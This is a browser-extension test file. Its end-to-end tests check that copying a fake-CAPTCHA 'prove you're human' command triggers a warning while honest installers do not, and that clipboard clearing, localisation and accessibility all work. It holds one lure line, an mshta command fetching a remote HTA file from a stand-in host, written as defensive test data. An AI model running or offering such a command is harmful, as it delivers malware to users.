// E2E checks: CG. These check the command check. On an AI chat, copying a "paste this command to prove you're
// human" lure shows a note, and copying an honest installer doesn't. The copy itself is never changed, and
// "Clear what I copied" empties the clipboard. It never runs on email and chat apps, and switches off when the
// setting is off. Run in order by ../run.js with one shared env (helpers from ../lib.js).
"use strict";

module.exports = async function (env) {
  const { EXT, Skip, auditShadow, check, clotrActive, ctx, expect, launch, openSite } = env;
  const { readNotice, clickNode, resetState, shotAt, sleep, store, waitFor, withSite } = env;

  const ORIGIN = "https://huggingface.co";
  const LURE = "mshta https://captcha.example.invalid/verify.hta";

  // Reading and writing the clipboard needs permission. This grants it for the test origin.
  async function allowClipboard(context) {
    try {
      await context.overridePermissions(ORIGIN, ["clipboard-read", "clipboard-write"]);
      return true;
    } catch {
      return false;
    }
  }
  const clipped = await allowClipboard(ctx.browser.defaultBrowserContext());

  const readClip = (page) => page.evaluate(() => navigator.clipboard.readText().catch(() => null));

  // Selects a code block's text and copies it with Ctrl+C, a real copy event the content script can hear.
  async function selectAndCopy(page, id) {
    await page.bringToFront();
    await page.evaluate((nodeId) => {
      const node = document.getElementById(nodeId);
      const range = document.createRange();
      range.selectNodeContents(node);
      const sel = window.getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
    }, id);
    await page.keyboard.down("Control");
    await page.keyboard.press("c");
    await page.keyboard.up("Control");
    await sleep(400);
  }

  // Clicks the page's own Copy button beside a code block. It writes the clipboard directly, without firing a
  // copy event.
  async function clickCopy(page, which) {
    await page.bringToFront();
    await page.click(`#${which} button.copy`);
    await sleep(400);
  }

  const noteShown = (page) => waitFor(() => readNotice(page), 2500);
  async function noNote(page, why) {
    await sleep(1200);
    const note = await readNotice(page);
    expect(!note, `${why}, but a note appeared: ${note?.text}`);
  }

  await check("CG1", "Selecting and copying a lure shows the note once", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      expect(clotrActive(page), "Clotr didn't run on the command page");
      await selectAndCopy(page, "lure-code");
      const note = await noteShown(page);
      expect(note, "no note after copying the lure");
      expect(/you copied a command/.test(note.text), `note text: ${note.text}`);
      // The note only shows once per command: closing it and copying the same lure again brings up nothing new.
      const keep = note.buttons.find((b) => b.text === "Keep it");
      expect(keep, `no "Keep it": ${JSON.stringify(note.buttons.map((b) => b.text))}`);
      await clickNode(page, keep.nodeId);
      await sleep(300);
      await selectAndCopy(page, "lure-code");
      await noNote(page, "the same lure copied again");
    }),
  );

  await check("CG2", "A code block's Copy button copies the lure and shows the note", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await clickCopy(page, "lure");
      const note = await noteShown(page);
      expect(note && /you copied a command/.test(note.text), `note: ${note?.text}`);
    }),
  );

  await check("CG3", "Copying an honest installer shows nothing", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await clickCopy(page, "honest");
      await noNote(page, "an honest installer copied");
      await selectAndCopy(page, "honest-code");
      await noNote(page, "an honest installer selected and copied");
    }),
  );

  await check("CG4", "The copy is unchanged: Clotr never touches the clipboard", async () => {
    if (!clipped) throw new Skip("the browser wouldn't grant clipboard access under automation");
    return withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      // Uses a real Ctrl+C so the browser writes the selection itself. Headless Chrome denies
      // navigator.clipboard.writeText, so the page's own Copy button can't put text on the clipboard here.
      await selectAndCopy(page, "lure-code");
      await noteShown(page);
      const after = await readClip(page);
      if (after === null) throw new Skip("the clipboard couldn't be read back under automation");
      expect(after === LURE, `clipboard is "${after}", expected "${LURE}" (Clotr changed the copy)`);
    });
  });

  await check("CG5", "Clear what I copied empties the clipboard, or says it couldn't", async () => {
    if (!clipped) throw new Skip("the browser wouldn't grant clipboard access under automation");
    return withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await selectAndCopy(page, "lure-code");
      const note = await noteShown(page);
      const before = await readClip(page);
      if (before === null) throw new Skip("the clipboard couldn't be read back under automation");
      expect(before === LURE, `clipboard before clear: "${before}"`);
      const clear = note.buttons.find((b) => b.text === "Clear what I copied");
      expect(clear, `no "Clear what I copied": ${JSON.stringify(note.buttons.map((b) => b.text))}`);
      await clickNode(page, clear.nodeId);
      await sleep(400);
      const after = await readClip(page);
      const status = (await readNotice(page))?.text || "";
      // Either the clipboard is empty, or the browser refused the write, as headless automation does, and the
      // note says so, leaving the copy harmless until it's pasted somewhere. Either way Clotr never leaves a
      // changed command behind.
      const refused = /couldn't clear it/.test(status) && after === LURE;
      expect(after === "" || refused, `after clear: clipboard "${after}", status "${status}"`);
      return after === "" ? "cleared" : "browser refused the write; note says so";
    });
  });

  await check("CG6", "On an email or chat app the command check never runs", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await store.set(ctx, { siteKinds: { "huggingface.co": "everyday" } });
      await sleep(300);
      await clickCopy(page, "lure");
      await noNote(page, "an everyday site");
      await store.set(ctx, { siteKinds: {} });
    }),
  );

  await check("CG7", "commandCheck off: copying the lure shows nothing", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await store.set(ctx, { commandCheck: false });
      await sleep(300);
      await clickCopy(page, "lure");
      await noNote(page, "the setting is off");
      await store.set(ctx, { commandCheck: true });
    }),
  );

  // Takes screenshots of the note for the review, at a phone's 380px width and at real desktop size, dark then light.
  await check("CG9", "Screenshots of the command note (380 px and real size, light and dark)", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await selectAndCopy(page, "lure-code");
      expect(await noteShown(page), "no note to screenshot");
      for (const theme of ["dark", "light"]) {
        await shotAt(page, `cg-command-note-380-${theme}.png`, { width: 380, height: 720, theme });
        await shotAt(page, `cg-command-note-real-${theme}.png`, { width: 1000, height: 700, theme });
      }
      return "cg-command-note-{380,real}-{dark,light}.png";
    }),
  );

  await check("CG10", "No serious accessibility problems (axe-core) in the command note, light and dark", () =>
    withSite(ctx, "command", async (page) => {
      await resetState(ctx, {});
      await selectAndCopy(page, "lure-code");
      expect(await noteShown(page), "no note to audit");
      const problems = [];
      for (const theme of ["light", "dark"]) {
        await page.emulateMediaFeatures([{ name: "prefers-color-scheme", value: theme }]);
        await sleep(150);
        const found = await auditShadow(page, "CLOTR-NOTICE");
        if (!found) problems.push(`${theme}: not on screen to check`);
        else problems.push(...found.map((f) => `${theme}: ${f}`));
      }
      expect(!problems.length, problems.slice(0, 8).join(" | "));
    }),
  );

  await check("CG8", "Spanish browser: the note is in Spanish", async () => {
    const es = await launch(EXT, ["--lang=es-ES", "--accept-lang=es-ES"], { LANGUAGE: "es", LANG: "es_ES.UTF-8" });
    try {
      await allowClipboard(es.browser.defaultBrowserContext());
      await resetState(es, {});
      const page = await openSite(es, "command");
      try {
        await clickCopy(page, "lure");
        const note = await waitFor(() => readNotice(page), 2500);
        expect(note && /copiaste un comando/.test(note.text), `Spanish note: ${note?.text}`);
        const names = note.buttons.map((b) => b.text);
        expect(names.includes("Borrar lo que copié"), `Spanish buttons: ${JSON.stringify(names)}`);
      } finally {
        await page.close();
      }
    } finally {
      await es.browser.close();
    }
  });
};
